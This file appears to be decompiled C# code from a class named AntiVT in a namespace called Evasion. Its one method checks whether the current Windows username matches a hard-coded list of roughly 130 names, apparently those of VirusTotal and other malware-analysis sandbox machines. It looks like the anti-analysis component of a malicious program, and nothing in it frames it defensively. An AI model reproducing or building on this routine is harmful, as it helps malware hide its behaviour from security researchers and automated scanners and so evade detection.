using System;
using System.Runtime.CompilerServices;

namespace Evasion
{
	// Token: 0x0200001C RID: 28
	public static class AntiVT
	{
		// Token: 0x0600003A RID: 58 RVA: 0x0000468C File Offset: 0x0000288C
		public static bool IsVirusTotal()
		{
			string userName = Environment.UserName;
			return Array.IndexOf<string>(AntiVT.VtPCNames, userName) > -1;
		}

		// Token: 0x0400003D RID: 61
		[global::System.Runtime.CompilerServices.Nullable(1)]
		public static readonly string[] VtPCNames = new string[]
		{
			"05h00Gi0", "3u2v9m8", "43By4", "4tgiizsLimS", "6O4KyHhJXBiR", "7wjlGX7PjlW4", "8Nl0ColNQ5bq", "8VizSM", "Abby", "Amy",
			"AppOnFlySupport", "ASPNET", "azure", "BUiA1hkm", "BvJChRPnsxn", "cM0uEGN4do", "cMkNdS6", "DefaultAccount", "dOuyo8RV71", "DVrzi",
			"e60UW", "ecVtZ5wE", "EGG0p", "Frank", "fred", "G2DbYLDgzz8Y", "george", "GjBsjb", "Guest", "h7dk1xPr",
			"h86LHD", "Harry Johnson", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF", "j6SHA37KA", "j7pNjWM", "John", "jude",
			"Julia", "kEecfMwgj", "kFu0lQwgX5P", "KUv3bT4", "Lisa", "lK3zMR", "lmVwjj9b", "Louise", "Lucas", "mike",
			"Mr.None", "noK4zG7ZhOf", "o6jdigq", "o8yTi52T", "OgJb6GqgK0O", "patex", "PateX", "Paul Jones", "pf5vj", "PgfV1X",
			"PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "RDhJ0CNFevzX", "RGzcBUyrznReg", "S7Wjuf",
			"server", "SqgFOf3G", "Steve", "test", "TVM", "txWas1m2t", "umyUJ", "Uox1tzaMO", "User01", "w0fjuOVmCcP5A",
			"WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "ykj0egq7fze", "DdQrgc", "ryjIJKIrOMs", "nZAp7UBVaS1", "zOEsT", "l3cnbB8Ar5b8", "xUnUy",
			"fNBDSlDTXY", "vzY4jmH0Jw02", "gu17B", "UiQcX", "21zLucUnfI85", "OZFUCOD6", "8LnfAai9QdJR", "5sIBK", "rB5BnfuR2", "GexwjQdjXG",
			"IZZuXj", "ymONofg", "dxd8DJ7c", "JAW4Dz0", "GJAm1NxXVm", "UspG1y1C", "equZE3J", "BXw7q", "lubi53aN14cU", "5Y3y73",
			"9yjCPsEYIMH", "GGw8NR", "JcOtj17dZx", "05KvAUQKPQ", "64F2tKIqO5", "7DBgdxu", "uHUQIuwoEFU", "gL50ksOp", "Of20XqH4VL", "tHiF2T",
			"sal.rosenburg", "hbyLdJtcKyN1", "Rt1r7", "katorres", "doroth", "umehunt"
		};
	}
}
